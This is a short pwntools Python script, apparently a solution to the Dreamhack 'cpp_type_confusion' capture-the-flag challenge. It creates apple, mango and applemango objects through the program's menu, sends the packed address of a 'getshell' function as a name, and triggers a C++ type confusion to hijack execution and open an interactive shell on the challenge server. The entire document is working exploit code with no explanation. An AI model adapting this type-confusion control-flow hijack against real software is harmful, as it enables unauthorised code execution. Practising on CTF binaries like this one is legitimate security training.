from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/cpp_type_confusion/cpp_type_confusion')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:8735'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
getshell = 0x400FA6

#create apple
p.recvuntil(b": ")
p.sendline(b"1")

#create mango
p.recvuntil(b": ")
p.sendline(b"2")

#create applemango
p.recvuntil(b": ")
p.sendline(b"3")

#send "name"
p.recvuntil(b": ")
p.sendline(p64(getshell))

#eat applemango
p.recvuntil(b": ")
p.sendline(b"4")

p.recvuntil(b": ")
p.sendline(b"3")


p.interactive()
